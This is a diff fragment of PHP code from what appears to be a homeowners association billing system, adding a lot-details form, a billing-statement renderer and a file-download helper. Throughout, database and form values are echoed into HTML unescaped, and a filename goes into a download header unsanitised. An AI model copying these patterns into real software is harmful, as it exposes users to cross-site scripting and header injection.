+              <!--<label for="dateacquired">Date Acquired</label>-->
+              <!--<input type="date" id="dateacquired" name="dateacquired" data-role="date"  value="<?php echo $dateacquired; ?>"/>-->
+              <label for="lotsize">Lot Size (sq. m)</label>
+              <input type="number" id="lotsize" name="lotsize" step="0.1" value="<?php echo $lotsize; ?>"/>
+              <label for="housenumber">House Number</label>
+              <input type="text" id="housenumber" name="housenumber" value="<?php echo $housenumber; ?>"/>
+              <label for="street">Street</label>
+              <input type="text" id="street" name="street" value="<?php echo $street; ?>"/>
+              <label for="lot">Lot</label>
+              <input type="text" id="lot" name="lot" value="<?php echo $lot; ?>"/>
+              <label for="block">Block</label>
+              <input type="text" id="block" name="block" value="<?php echo $block; ?>"/>
+              <label for="phase">Phase</label>
+              <input type="text" id="phase" name="phase" value="<?php echo $phase; ?>"/>
+              <!--<label for="numberinhousehold">Number in Household</label>-->
+              <!--<input type="number" id="numberinhousehold" name="numberinhousehold" value="<?php echo $numberinhousehold; ?>"/>-->
+              <!--<input type="hidden" name="homeowner" id="homeowner" value="<?php echo $homeowner; ?>"/>-->
+              <input type="hidden" name="lotid" id="lotid" value="<?php echo $lotid; ?>" required="true"/>
+
+              <input type="submit" value="Submit" data-icon="arrow-d"/>
+          </form>
+        </div>
+    </div>    
+    <?php
+}
+
+function formatBill($id,$code,$address,$lotsize,$fullname,$dues,$balance)
+{
+    global $conn;
+//    $stmt=$conn->prepare("SELECT a.id,a.dateposted,a.description,(SUM(a.amount)-SUM(a.amountpaid)) AS balance FROM charges a WHERE a.amount>a.amountpaid AND a.active=1 AND a.lot=? GROUP BY a.id");
+    $stmt=$conn->prepare("SELECT a.id, a.dateposted, a.description, a.amount, SUM(COALESCE(c.amountpaid*b.active,0)) AS amtpaid FROM charges a LEFT JOIN ledgeritem c ON a.id=c.chargeid LEFT JOIN ledger b ON b.id=c.ledgerid WHERE a.lot=? AND a.active=1 GROUP BY a.id HAVING a.amount>SUM(COALESCE(c.amountpaid,0)) ORDER BY a.dateposted, a.description");
+    if($stmt === false) {
+        trigger_error('<strong>Error:</strong> '.$conn->error, E_USER_ERROR);
+    }
+    $stmt->bind_param('i',$id);
+    $stmt->execute();
+    $stmt->store_result();
+    ?>
+    <div class="soapage">
+        <?php displayPrintHeader(); ?>
+        <h3 class="printtitle">Billing Statement</h3>
+        <table class="printacctinfo">
+            <tr>
+                <th>Account Name</th>
+                <td>:</td>
+                <td><?php echo $fullname; ?></td>
+            </tr>
+            <tr>
+                <th>Lot Code</th>
+                <td>:</td>
+                <td><?php echo $code; ?></td>
+            </tr>
+            <tr>
+                <th>Address</th>
+                <td>:</td>
+                <td><?php echo $address; ?></td>
+            </tr>
+            <tr>
+                <th>Lot Size</th>
+                <td>:</td>
+                <td><?php echo $lotsize; ?> sq. m.</td>
+            </tr>
+            <tr>
+                <th>Monthly Due Amount</th>
+                <td>:</td>
+                <td><?php echo $dues; ?></td>
+            </tr>
+        </table>
+
+        <table class="tblcharges">
+            <thead>
+                <th>Date</th>
+                <th>Description</th>
+                <th>Balance</th>
+            </thead>
+            <tbody>
+        <?php
+        if($stmt->num_rows>0)
+        {
+            $stmt->bind_result($cid,$dateposted,$description,$camount,$camountpaid);
+            $totalbal=0;
+            while($stmt->fetch()){ 
+                $totalbal += ($camount-$camountpaid); ?>
+                <tr>
+                    <td><?php echo $dateposted; ?></td>
+                    <td><?php echo $description; ?></td>
+                    <td class="textamount"><?php echo number_format(($camount-$camountpaid),2); ?></td>
+                </tr>
+            <?php }
+            if(round($balance,2) < round($totalbal,2)){ ?>
+                <tr>
+                    <td>--</td>
+                    <td><em>Less from Discounts &amp; Advanced Payments</em></td>
+                    <td class="textamount"><?php echo number_format($balance-$totalbal,2); ?></td>
+                </tr>
+            <?php
+            }
+        }
+        else
+        {
+            ?>
+                <tr>
+                    <td colspan="3" class="nocharges">No charges.</td>
+                </tr>
+            <?php
+        }
+        ?>
+            </tbody>
+            <tfoot>
+                <th colspan="2" class="printtotalbal">Total</th>
+                <th class="textamount" class="printbal"><?php echo number_format($balance,2); ?></th>
+            </tfoot>
+        </table>
+        <footer>
+            <div>Prepared by:</div>
+            <div class="printpreparedby"><?php echo $_SESSION["fullname"]; ?></div>
+            <div class="gentimestamp">Generated on <?php date_default_timezone_set("Asia/Manila"); echo date('Y-m-d h:i:s A', time());?></div>
+        </footer>
+    </div>
+    <?php
+    $stmt->close();
+}
+
+function displayPrintHeader()
+{
+    ?>
+        <header class="printheader">
+            <img src="images/staisabellogo.jpg" alt="Santa Isabel Logo" class="headerlogo"/>
+            <div class="subdname"><?php echo $_SESSION["settings"]["assocname"]; ?></div>
+            <div><?php echo $_SESSION["settings"]["subdname"],", ".$_SESSION["settings"]["brgy"].", ".$_SESSION["settings"]["city"].", ".$_SESSION["settings"]["province"]." ".$_SESSION["settings"]["zipcode"]; ?></div>
+            <div><?php echo "<strong>Tel.:</strong> ".$_SESSION["settings"]["contactno"]." / <strong>Email:</strong> ".$_SESSION["settings"]["email"] ?></div>
+        </header>
+    <?php
+}
+
+function forceDownload($f,$size,$content)
+{
+	header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename='.$f);
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . $size);
+	echo $content;
+}
 ?>
